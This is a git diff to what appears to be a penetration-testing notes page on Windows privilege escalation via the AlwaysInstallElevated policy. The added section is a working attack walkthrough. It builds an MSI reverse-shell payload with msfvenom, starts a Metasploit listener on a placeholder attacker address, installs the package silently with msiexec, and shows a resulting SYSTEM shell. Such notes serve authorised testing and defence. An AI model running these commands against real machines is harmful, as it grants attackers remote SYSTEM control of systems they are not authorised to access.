@@ -1,6 +1,33 @@
 # AlwaysInstallElevated: Privilege Escalation
 
-**MSI packages** can be installed with **elevated privileges** for non-admin users.
+**MSI packages** can be installed with **elevated privileges** by non-admin users.
+
+## Get an elevated reverse shell
+
+1. Generate an **MSI payload** to get an elevated **reverse shell**
+
+        msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=4444 -f msi > elevated_shell.msi
+
+2. Use `exploit/multi/handler` metasploit module to start a listener
+
+        msfconsole
+        use exploit/multi/handler
+        set payload windows/shell/reverse_tcp
+        set LHOST <Local IP Address>
+        set LPORT 4444
+        run
+
+3. Run following command to execute the malicious Windows Installer file
+
+        msiexec /q /i .\elevated_shell.msi
+
+4. Confirm if the privileges got escalated successfully by running `whoami`
+
+        C:\Windows\system32>whoami
+        whoami
+        nt authority\system
+
+## Add local admin privileges
 
 1. Verify whether the Windows installer has elevated privileges or not
 
@@ -38,3 +65,5 @@
 * https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
 * https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/
 * https://docs.microsoft.com/en-us/windows/win32/msi/command-line-options
+* https://www.tutorialspoint.com/get-the-reverse-shell-with-msi-package
+* https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/
